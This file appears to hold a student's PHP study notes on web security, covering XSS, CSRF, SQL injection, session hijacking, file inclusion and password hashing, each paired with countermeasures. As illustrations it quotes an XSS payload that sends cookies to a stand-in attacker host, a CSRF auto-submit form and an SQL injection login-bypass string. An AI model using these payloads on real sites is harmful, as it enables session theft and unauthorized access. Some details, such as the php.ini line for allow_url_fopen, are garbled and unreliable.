<?php
/*
Security

Basic Rules

All input (from the outside) is (potentially) evil
	Filter/validade input
	Escape output

Trust no data from the outisde
	GET/POST data
	Cookies 
	HTTP headers

	...And more: web services, databases, URLs, environmet variables

XSS
Cross-site Scripting

Injection of HTML, CSS or script code into a page
	Either permanently (e.g guestbook/forum)
	Or via link

Especially dangerous: JavaScript

	Can redirect the user
	Can modify the page 
	Can read out cookies
	Any many more....

Examples:
	
	<script>alert(document.cookie)</script>

	<script> (new Image()).src = "http://evil.xe?"+ escape(document.cookie)</script>

	<div style="display:nome">

	<meta http-equiv="refresh" content="0; url=http://evil.xs/" />

Countermeasures
	Escape data type before outputting it
		htmlspecialchars(string)
		htmlentities(string)
		strip_tags(str) (does not work for attribute values)	
	Blcklist approach is insufficient
		Too many possibilities - Ex::JavaScript event handlers

CSRF
	Cross-site Request Forgeries
		Creates HTTP request
		Website trust logged-in users
		Attacks are usually executed via iframes or via XMLHttpRequest
		request or <script>, <object>, <embed>, <img>, ...
		Attacker employs user's browser to execute requests on the attacker's behalf

	Examples: <img src= "http://shop.xy/buy.php?item_id=123&quantity=1"/>

	<from  name='myF' action = ""http://shop.xy/buy.php">
		<input type='hidden' name='qant_id' value='123'>
		<input type='hidden' name='quantity' value='123'>
	</form>
	<script>document.forms['myF'].submit();</script>

	Countrmeasures

	Use unique token in the form
	Require re-login before "dangerous" operations

SQL Injection

	SQl code is injected into th SQL query

	Allows almost anything the database user is allowed to do
	
	$sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass' "

	$user amd $pass contain the value
	' OR ''='
	Futher possibilities: insert data, delete data, read data, DoS, ...
	
Countermeasures
	Prepared Statements (if supported by the database extension)
	Database specific escaping functions
		ex:mysqli_real_escape_string()
	addslashes() is insufficient

Session Attacks
	Session Hijacking
		Session ID is stolen
		Session ID is the sole authentication token for the web site, thereforem the user's session is hijacked
	Session Fixation
		User gets a "fixed" sesion ID (usually via an speciallycrafterd URL)

Countermeasures
	Change session ID prior to 'critical' operations using 
	session_regenerate_id(true)

	Short session timeout

	Use PHP configuration setting session.use_only_cookies

Code Injection
	include "/path/to".$_GET['file'];
	include $_GET['file']. '.php';
	
	Including files (/etc/passwd etc.)

	Including and executing files
		Also possible from remote servers
		This includes remote code execution!

Countermeasures
	Check data against whitelist
	Remove paths using basename();
	allow_url_fopen = date_offset_get() in php.ini
		Helps a bit, but some attack vectors remain open
	
	Another type of code injection can be done when using dynamic data calls to system() et al.

	Countermeasurer
		Do not use System() et al.
		escapeshellarg(arg) escapes arguments
		escapeshellcmd(command) escapes commands

Secure Configuration
	Do not display errors
		display_erros = off
	But: log errors
		log_erros = on
	High error reporting setting
		error_reporting = E_ALL
		error_reporting = E_ALL | E_STRICT

Secure Passwords
	Do not save passwords in cleartext!

	Instead use a hash value

	Old approaches, not recommended any longer
		md5(): 32 characters, hexadecimal
		shal():40 characters hexadecimal

	Cannot be reversed, thought it can be brute-forced

//cai na prova
Password Hashing API
Easy to use wrapper around crypt()
Recommended way to hash passwords // new with v5.5

Functions
	password_hash($password, $algo[,$options])
	password_get_info($hash)
	password_needs_rehash($hash, $algo[,$options])
	password_verify($password, &hash)

Examples
	$ = password_hash("top-secret", PASSWORD_BCRYPT)
	//$p === "$asdfas$sdfgh.asdf/f5asdfsd.asdf.sdf.a.asdfweqrweFAffas"

	var_dump($password_get_info($p));

	Output

	array(3){ 
		['algo'] => int(1)
		['algoName'] => string(6)
		['options'] => 
		['cost'] => int(10)}
		}
	}

*/
?>